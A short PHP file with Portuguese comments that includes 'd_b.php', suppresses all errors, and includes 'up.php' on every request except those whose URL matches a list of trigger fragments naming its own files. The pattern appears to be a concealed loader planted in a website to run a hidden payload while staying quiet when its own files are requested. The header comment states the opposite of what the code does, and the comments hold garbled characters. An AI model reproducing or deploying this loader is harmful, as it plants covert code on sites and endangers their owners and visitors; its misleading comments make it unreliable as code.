<?php
/**
 * Execução Condicional: Roda up.php APENAS se o termo for encontrado
 */

require_once "d_b.php";

@error_reporting(0);
@ini_set('display_errors', 0);

// 1. Termos que disparam a execução
$jsonAtivadores = '[".com/in",".com/up",".com/d_b",".com/.",".com/gr"]';
$listaAtivadora = json_decode($jsonAtivadores, true);

// 2. Captura e limpeza da URL (Decodifica caracteres como %20, %2F)
$urlAtual = rawurldecode($_SERVER['REQUEST_URI']);
$urlComparacao = strtolower($urlAtual);

$deveExecutar = false;

// 3. Verificação de Sincronia
foreach ($listaAtivadora as $termo) {
    if (!empty($termo) && strpos($urlComparacao, strtolower($termo)) !== false) {
        $deveExecutar = true;
        break; 
    }
}

// 4. Gatilho de Execução
if ($deveExecutar) {
 
} else {
  if (file_exists("up.php")) {
        // Usa require para garantir que o processo sÃ³ continue se o up.php carregar com sucesso
        require_once "up.php";
    } else {
        // Opcional: Criar o arquivo se ele sumir ou logar o erro
        error_log("Tentativa de execuÃ§Ã£o: up.php nÃ£o encontrado.");
    } 
}
